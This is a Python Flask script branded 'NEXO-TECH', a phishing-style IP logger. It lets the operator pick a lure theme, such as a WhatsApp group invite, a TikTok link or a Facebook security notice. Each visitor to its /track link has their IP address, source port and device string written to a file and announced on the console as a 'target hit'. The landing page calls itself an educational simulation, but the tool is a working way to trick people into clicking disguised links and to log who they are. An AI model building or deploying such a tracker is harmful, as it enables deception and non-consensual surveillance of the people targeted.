import os
import datetime
from flask import Flask, request, render_template_string

app = Flask(__name__)

# --- NEXO-TECH COLORS ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

# --- THE "TEACHABLE MOMENT" PAGE ---
EDUCATIONAL_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>NEXO-TECH Security Alert</title>
    <style>
        body { background-color: #0d1117; color: #58a6ff; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
        .warning { color: #f85149; font-size: 40px; font-weight: bold; }
        .box { border: 2px solid #238636; padding: 20px; display: inline-block; margin-top: 20px; border-radius: 10px; }
    </style>
</head>
<body>
    <div class="warning">⚠️ NEXO-TECH SECURITY ALERT ⚠️</div>
    <div class="box">
        <h2>Educational Phishing Simulation</h2>
        <p>Your <b>IP Address</b> and <b>Connection Port</b> were just logged.</p>
        <p>Stay Safe: Never click suspicious links!</p>
    </div>
</body>
</html>
"""

def show_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print("{C}{B}".format(C=C, B=B))
    print("  _   _  _______   _____    _____ ______ _____ _    _ ")
    print(" | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |")
    print(" |  \| | | |__   \ V / | | |   | | | |__ | |    | |__| |")
    print(" | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |")
    print(" | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |")
    print(" |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_|")
    print("{G}======================================================={W}".format(G=G, W=W))
    print("{Y}  CREATED BY:  {W}NEXO-TECH".format(Y=Y, W=W))
    print("{Y}  INSPIRED BY: {W}DEMON ALEX && BLUEY".format(Y=Y, W=W))
    print("{G}======================================================={W}\n".format(G=G, W=W))

THEMES = {
    "1": "WhatsApp Group Invite",
    "2": "YouTube Viral Video",
    "3": "TikTok Trending",
    "4": "Facebook Security",
    "5": "Instagram DM",
    "6": "Festival Link",
    "7": "Happy Birthday Link"
}

selected_theme = "1"

@app.route('/track')
def track_ip():
    # --- CAPTURING IP AND PORT ---
    user_ip = request.remote_addr
    user_port = request.environ.get('REMOTE_PORT') # This captures the target's port
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Save to nexo_database.txt
    with open("nexo_database.txt", "a") as f:
        f.write("[{}] IP: {} | PORT: {} | Mask: {} | Device: {}\n".format(
            timestamp, user_ip, user_port, THEMES[selected_theme], user_agent))

    # --- REAL-TIME NEXO-TECH ALERT ---
    print("\n" + R + "[!] NEXO-TECH ALERT: TARGET HIT!" + W)
    print(G + "[+] Captured IP:   " + W + str(user_ip))
    print(G + "[+] Captured Port: " + W + str(user_port))
    print(C + "[*] Mask Used:     " + W + THEMES[selected_theme])
    print(C + "[*] Device Info:   " + W + str(user_agent)[:50] + "...")
    
    return render_template_string(EDUCATIONAL_PAGE)

if __name__ == '__main__':
    show_banner()
    print(Y + "[+] SELECT YOUR PHISHING THEME:" + W)
    for key, name in THEMES.items():
        print("  {G}{}.{W} {}".format(key, name, G=G, W=W))
    
    choice = input("\n" + Y + "Selection [1-7]: " + W)
    selected_theme = choice if choice in THEMES else "1"
    
    show_banner()
    print(C + "[*] NEXO-TECH ENGINE: {G}[ ONLINE ]{W}".format(G=G, W=W))
    print(C + "[*] TARGET MASK:      {W}{}".format(THEMES[selected_theme], W=W))
    print(G + "-------------------------------------------------------" + W)
    
    app.run(host='0.0.0.0', port=5000)
